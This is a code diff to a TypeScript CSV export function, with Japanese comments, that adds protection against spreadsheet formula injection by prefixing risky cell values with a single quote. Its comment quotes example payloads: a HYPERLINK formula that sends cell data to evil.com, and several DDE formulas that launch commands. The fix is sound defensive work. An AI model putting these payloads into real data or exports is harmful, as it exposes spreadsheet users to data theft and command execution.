@@ -382,13 +382,31 @@ function jsonReplacer(_key: string, value: unknown): unknown {
 // 内部: CSV ビルダー
 // ================================================================
 
-/** RFC 4180 互換の CSV エスケープ */
-function csvEscape(value: unknown): string {
+/**
+ * RFC 4180 互換の CSV エスケープ + Formula Injection 対策 (CWE-1236)。
+ *
+ * 2026-05-13 (security/csv-formula-injection, B-4):
+ *   Excel/Google Sheets が `=`/`+`/`-`/`@`/`\t`/`\r` で始まる値を **数式評価** するため、
+ *   悪意ユーザが `displayName = '=HYPERLINK("https://evil.com/?"&A1, "click")'` のような
+ *   ペイロードを CSV エクスポートに混入させると、admin/super がファイルを開いた瞬間に
+ *   外部 URL を踏まされて資格情報が抜かれる攻撃が成立する (CSV Injection)。
+ *   対象文字で始まる値は `'` (シングルクォート) を前置し、Excel に文字列として
+ *   解釈させる (OWASP 推奨手法)。
+ *
+ *   攻撃ペイロード例:
+ *     =cmd|'/c calc'!A1
+ *     @SUM(1+1)*cmd|'/c calc'!A1
+ *     -2+3+cmd|'/c calc'!A1
+ *     \tDDE("cmd", ...)  ← タブ始まり
+ */
+export function csvEscape(value: unknown): string {
   if (value == null) return '';
   let s: string;
   if (value instanceof Date) s = value.toISOString();
   else if (typeof value === 'object') s = JSON.stringify(value);
   else s = String(value);
+  // B-4: Formula Injection 対策。数式メタ文字で始まる値は `'` で文字列化を強制。
+  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
   if (/[",\r\n]/.test(s)) {
     return `"${s.replace(/"/g, '""')}"`;
   }
